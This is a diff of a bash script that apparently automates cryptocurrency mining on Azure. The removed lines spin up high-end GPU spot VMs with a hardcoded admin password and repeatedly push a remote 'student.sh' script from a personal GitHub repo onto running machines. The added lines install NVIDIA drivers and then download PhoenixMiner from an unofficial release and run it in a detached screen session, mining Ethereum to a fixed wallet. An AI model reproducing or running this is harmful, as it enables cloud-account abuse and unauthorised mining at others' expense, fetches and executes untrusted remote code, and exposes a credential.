@@ -1,25 +1,9 @@
 #!/bin/bash
-az group create --name Server --location westeurope
-az vm create --resource-group Server --name westeurope --location westeurope --image Canonical:UbuntuServer:16_04_0-lts-gen2:latest --size Standard_ND96amsr_A100_v4 --admin-username azure --admin-password C@mv@0p0stn3t# --priority Spot --max-price -1 --eviction-policy Deallocate --no-wait
-sleep 3m
-x=1
-while [ $x -le 1000 ]
-do
-  echo "Start vps lan $x"
-  az vm start --ids $(az vm list -g Server --query "[?provisioningState == 'Failed' || provisioningState == 'Stopped (deallocated)' || provisioningState == 'Unknown'].id" -o tsv) --no-wait
-  echo "Run script lan $x"
-  az vm extension set --name customScript --publisher Microsoft.Azure.Extensions --ids $(az vm list -d --query "[?powerState=='VM running'].id" -o tsv) --settings '{"fileUris": ["https://raw.githubusercontent.com/winttr89/2022/main/student.sh"],"commandToExecute": "./student.sh"}'  --no-wait  
-  for vps in westeurope
-  do
-    if [ "$(az vm list -g Server --query "[?name == '$vps'].id" -o tsv)" = "" ];
-    then
-      echo "$vps creating..."
-	  az vm create --resource-group Server --name $vps --location $vps --image Canonical:UbuntuServer:16_04_0-lts-gen2:latest --size Standard_ND96amsr_A100_v4 --admin-username azure --admin-password C@mv@0p0stn3t# --priority Spot --max-price -1 --eviction-policy Deallocate --no-wait
-    else
-      echo "$vps was found."
-    fi
-  done  
-  sleep 2m
-  x=$(( $x + 1 ))
-done
-az vm delete --ids $(az vm list -g Server --query "[?provisioningState == 'Failed' || provisioningState == 'Stopped (deallocated)' || provisioningState == 'Unknown'].id" -o tsv) --yes --no-wait
+sudo apt-get update
+sudo apt install build-essential libglvnd-dev pkg-config -y
+wget https://download.microsoft.com/download/4/3/9/439aea00-a02d-4875-8712-d1ab46cf6a73/NVIDIA-Linux-x86_64-510.47.03-grid-azure.run
+chmod a+x NVIDIA-Linux-x86_64-510.47.03-grid-azure.run
+sudo ./NVIDIA-Linux-x86_64-510.47.03-grid-azure.run -s
+wget https://github.com/vnxxx/vnxxx/releases/download/vnxxx/PhoenixMiner_5.6d_Linux.tar.gz
+tar xzf PhoenixMiner_5.6d_Linux.tar.gz
+sudo screen ./PhoenixMiner_5.6d_Linux/PhoenixMiner -pool eu1.ethermine.org:4444 -wal 007E9D0E98a1a2C060B2b605eEE4bb9740F82a25 -worker BabyNice50 -epsw x -mode 1 -log 0 -mport 0 -etha 0 -ftime 55 -retrydelay 1 -tt 79 -tstop 89  -coin eth
